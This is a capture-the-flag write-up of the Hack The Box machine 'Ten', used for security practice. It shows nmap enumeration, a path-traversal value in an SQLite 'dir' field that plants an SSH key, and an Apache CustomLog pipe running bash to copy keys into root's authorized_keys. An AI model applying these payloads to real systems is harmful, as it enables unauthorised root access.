---
layout: writeup
name: "Ten"
platform: "HackTheBox"
category: "retired"
difficulty: "Hard"
permalink: /writeups/retired/ten/
os: "Hack The Box"
date: 2026-02-25
pwned: true
---
# 🧪 Machine Name: Ten

**Platform:** Hack The Box  
**IP Address:** 10.129.234.158  
**Difficulty:** Hard  

---

## 🧭 Overview

"Ten" was a highly engaging challenge combining web hosting logic, virtual hosting exploitation, FTP traversal, and a clever use of Apache's `CustomLog` pipe functionality to gain root access.

Initial access was gained through self-service web account creation and FTP access. Privilege escalation was achieved by leveraging control over Apache logging to inject and execute shell commands as root.

---

## 🔍 Enumeration

### Nmap Scan

```bash
nmap -p- --min-rate 10000 10.129.234.158
nmap -p 21,22,80 -sCV -oN nmapscan 10.129.234.158
```

**Ports Open:**  
- 21: Pure-FTPd  
- 22: OpenSSH  
- 80: Apache/2.4.52 (Ubuntu)

---

## 🌐 Web Exploration

- Web hosting signup created a personal subdomain (e.g., `inkedqt.ten.vl`) with FTP credentials
- Subdomain enumeration with FFUF revealed internal panel: `webdb.ten.vl`

### WebDB Exploitation

- Leaked FTP credentials with hashed password
- Modified user's `dir` entry in SQLite DB to gain write access outside sandbox

```json
"dir": "/srv/../home/tyrell/.ssh/./"
```

---

## 📂 FTP Traversal & SSH Access

- Uploaded public key to `/home/tyrell/.ssh/authorized_keys`
- Logged in as user `tyrell` via SSH
- Gained user flag

```bash
ssh -i ~/.ssh/myremotekey tyrell@ten.vl
cat .user.txt
```

---

## ⚙️ Privilege Escalation

- Apache `CustomLog` used as shell injection vector
- Used etcdctl to modify vhost config:

```apache
CustomLog "|/bin/bash -c 'cat /home/tyrell/.ssh/authorized_keys >> /root/.ssh/authorized_keys'" common
```

- SSH as root using same key

```bash
ssh -i ~/.ssh/myremotekey root@pwn1.ten.vl
cat /root/root.txt
```

---

## 🧠 Lessons Learned

- Subdomain self-service environments can lead to privilege boundaries being broken via configuration edits
- WebDB access with ability to edit paths is a high-risk misconfiguration
- Apache `CustomLog` pipe injection is a powerful and underused root vector
- `etcdctl` is a juicy target when exposed to users

---

## 📸 Proof

![Ten Proof](https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/HTB/proofs/ten.png)